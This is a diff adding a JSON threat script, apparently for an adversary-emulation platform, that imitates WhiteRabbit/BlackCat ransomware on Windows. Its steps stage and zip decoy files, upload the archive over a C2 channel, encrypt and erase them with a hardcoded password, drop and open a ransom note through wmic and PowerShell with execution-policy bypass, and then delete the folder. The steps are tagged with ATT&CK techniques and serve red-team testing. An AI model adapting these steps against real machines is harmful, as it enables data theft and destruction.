@@ -1,0 +1,126 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "https://github.com/scythe-io/community-threats/tree/master/BlackCat",
+        "display_name": "WhiteRabbit_v1",
+        "name": "WhiteRabbit_v1",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "--cp 127.0.0.1:443 --heartbeat 1 --multipart 10240 --secure true",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "2": {
+                "module": "run",
+                "request": "cmd /c mkdir \"%USERPROFILE%\\Desktop\\WhiteRabbit\"",
+                "rtags": [
+                    "att&ck-technique:T1059"
+                ],
+                "type": "message"
+            },
+            "3": {
+                "module": "loader",
+                "module_to_load": "file",
+                "request": "--load file",
+                "type": "message"
+            },
+            "4": {
+                "module": "file",
+                "request": "--create --path \"%USERPROFILE%\\Desktop\\WhiteRabbit\\important_files.doc\" --size 2MB --count 50",
+                "rtags": [
+                    "att&ck-technique:T1078"
+                ],
+                "type": "message"
+            },
+            "5": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell \"Compress-Archive -Path $env:userprofile\\Desktop\\WhiteRabbit -CompressionLevel Optimal -Destination $env:userprofile\\Desktop\\WhiteRabbit\\exfil.zip\"",
+                "rtags": [
+                    "att&ck-technique:T1074.001"
+                ],
+                "type": "message"
+            },
+            "6": {
+                "module": "loader",
+                "module_to_load": "uploader",
+                "request": "--load uploader",
+                "type": "message"
+            },
+            "7": {
+                "module": "uploader",
+                "request": "--remotepath \"%USERPROFILE%\\Desktop\\WhiteRabbit\\exfil.zip\"",
+                "rtags": [
+                    "att&ck-technique:T1041"
+                ],
+                "type": "message"
+            },
+            "8": {
+                "module": "loader",
+                "module_to_load": "crypt",
+                "request": "--load crypt",
+                "type": "message"
+            },
+            "9": {
+                "module": "crypt",
+                "request": "--target \"%USERPROFILE%\\Desktop\\WhiteRabbit\\\" --encrypt --password \"Wh1teR4bb1t\" --erase --recurse",
+                "rtags": [
+                    "att&ck-technique:T1486"
+                ],
+                "type": "message"
+            },
+            "10": {
+                "module": "loader",
+                "module_to_load": "downloader",
+                "request": "--load downloader",
+                "type": "message"
+            },
+            "11": {
+                "module": "downloader",
+                "request": "--src \"VFS:/shared/WhiteRabbit/README.scrypt.txt\" --dest \"%USERPROFILE%\\Desktop\\WhiteRabbit\\README.scrypt.txt\"",
+                "rtags": [
+                    "att&ck-technique:T1491.001"
+                ],
+                "type": "message"
+            },
+            "12": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "wmic process call create \"cmd /c powershell.exe -nop -ep bypass notepad.exe $env:userprofile\\Desktop\\WhiteRabbit\\README.scrypt.txt\"",
+                "rtags": [
+                    "att&ck-technique:T1047",
+                    "att&ck-technique:T1059.001"
+                ],
+                "type": "message"
+            },
+            "13": {
+                "module": "run",
+                "request": "cmd /c rmdir /Q /S %USERPROFILE%\\Desktop\\WhiteRabbit\"",
+                "rtags": [
+                    "att&ck-technique:T1551.004"
+                ],
+                "type": "message"
+            },
+            "14": {
+                "module": "controller",
+                "request": "--shutdown",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0011",
+                    "att&ck-technique:T1219"
+                ],
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29",
+        "tags": []
+    }
+}
